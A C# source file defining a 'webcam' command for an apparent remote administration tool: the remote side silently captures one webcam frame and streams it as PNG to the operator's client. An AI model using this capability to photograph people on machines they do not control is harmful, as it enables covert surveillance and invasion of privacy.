using AForge.Video;
using AForge.Video.DirectShow;
using Shared;
using System;
using System.Collections.Generic;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;
using System.Timers;
using Timer = System.Timers.Timer;

namespace Commands
{
    internal class Webcam : ICommand
    {
        #region ICommand properties
        public string name { get; } = "webcam";

        public string description { get; } = "Webcam control utility, able to take pictures and record videos";

        public string syntaxHelper { get; } = "webcam [picture|video] [fileToWrite]";

        public bool isLocal { get; } = false;

        public List<string> validArguments { get; } = new List<string>()
        {
            "picture ?",
            "video ?"
        };
        #endregion ICommand properties

        VideoCaptureDevice video { get; set; }

        bool mustReturn { get; set; }


        public bool PreProcessCommand(List<string> args)
        {
            throw  new NotImplementedException();
        }

        public void ClientMethod(List<string> args)
        {
            var fileName = args[1];

            var result = CommandsManager.networkManager.ReadLine();

            if (result != "OK")
            {
                ColorTools.WriteCommandError(result == "KO"
                    ? "Unable to use the webcam in the default timespan, maybe another application is using it"
                    : "Unable to find a webcam on the remote server");

                return;
            }

            // Get data length
            var dataLength = int.Parse(CommandsManager.networkManager.ReadLine());

            try
            {
                using (var fs = new FileStream(fileName, FileMode.Create))
                {
                    CommandsManager.networkManager.NetworkStreamToStream(fs, dataLength);
                }

                ColorTools.WriteCommandSuccess($"Screenshot saved : {fileName}");
            }
            catch (Exception)
            {
                // Delete the partially created file
                File.Delete(fileName);
                ColorTools.WriteCommandError("An error occured");
            }
        }

        public void ServerMethod(List<string> args)
        {
            // todo : implement video
            mustReturn = false;

            FilterInfo captureDevice;
            try
            {
                captureDevice = new FilterInfoCollection(FilterCategory.VideoInputDevice)[0];
            }
            catch (Exception)
            {
                CommandsManager.networkManager.WriteLine("NoCam");
                return;
            }

            video = new VideoCaptureDevice(captureDevice.MonikerString);
            video.NewFrame += Video_NewFrame;
            video.Start();

            // Leave 3 seconds to get a frame
            var timer = new Timer(3000);
            timer.Elapsed += timer_Elapsed;
            timer.AutoReset = false;
            timer.Enabled = true;

            while (!mustReturn)
            {
                Thread.Sleep(100);
            }
        }

        void Video_NewFrame(object sender, NewFrameEventArgs eventArgs)
        {
            video.SignalToStop();
            CommandsManager.networkManager.WriteLine("OK");

            using (var ms = new MemoryStream())
            {
                eventArgs.Frame.Save(ms, ImageFormat.Png);

                // Send the data length first
                CommandsManager.networkManager.WriteLine(ms.Length.ToString());

                // Reset memory stream position
                ms.Position = 0;
                CommandsManager.networkManager.StreamToNetworkStream(ms);
            }

            mustReturn = true;
        }

        void timer_Elapsed(object sender, ElapsedEventArgs e)
        {
            // If the video source is still running, no pic was taken
            if (video.IsRunning)
            {
                CommandsManager.networkManager.WriteLine("KO");
                mustReturn = true;
            }
        }
    }
}
